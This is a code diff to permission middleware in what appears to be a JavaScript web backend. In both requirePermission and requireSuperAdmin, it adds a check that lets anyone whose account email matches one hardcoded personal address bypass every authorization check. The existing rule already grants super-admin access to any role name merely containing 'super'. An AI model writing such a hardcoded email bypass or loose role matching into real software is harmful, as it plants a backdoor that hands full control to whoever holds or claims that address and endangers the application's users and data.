@@ -13,13 +13,15 @@ export const requirePermission = (permissionKey, sensitiveRecheck = false) => {
 
       const roleStr = String(user.role || '').toLowerCase();
       const roleNameStr = String(user.roleName || '').toLowerCase();
+      const emailStr = String(user.email || '').toLowerCase();
 
-      // Super Admin bypasses all checks
+      // Super Admin and Owner Email bypass all checks
       if (
         roleStr === 'super_admin' ||
         roleStr === 'superadmin' ||
         user.isSuperAdmin === true ||
-        roleNameStr.includes('super')
+        roleNameStr.includes('super') ||
+        emailStr === 'gautham3177@gmail.com'
       ) {
         return next();
       }
@@ -95,11 +97,13 @@ export const requireSuperAdmin = () => {
       return next(ApiError.unauthorized('Authentication required'));
     }
     const roleStr = String(user.role || '').toLowerCase();
+    const emailStr = String(user.email || '').toLowerCase();
     if (
       roleStr === 'super_admin' ||
       roleStr === 'superadmin' ||
       user.isSuperAdmin === true ||
-      String(user.roleName || '').toLowerCase().includes('super')
+      String(user.roleName || '').toLowerCase().includes('super') ||
+      emailStr === 'gautham3177@gmail.com'
     ) {
       return next();
     }
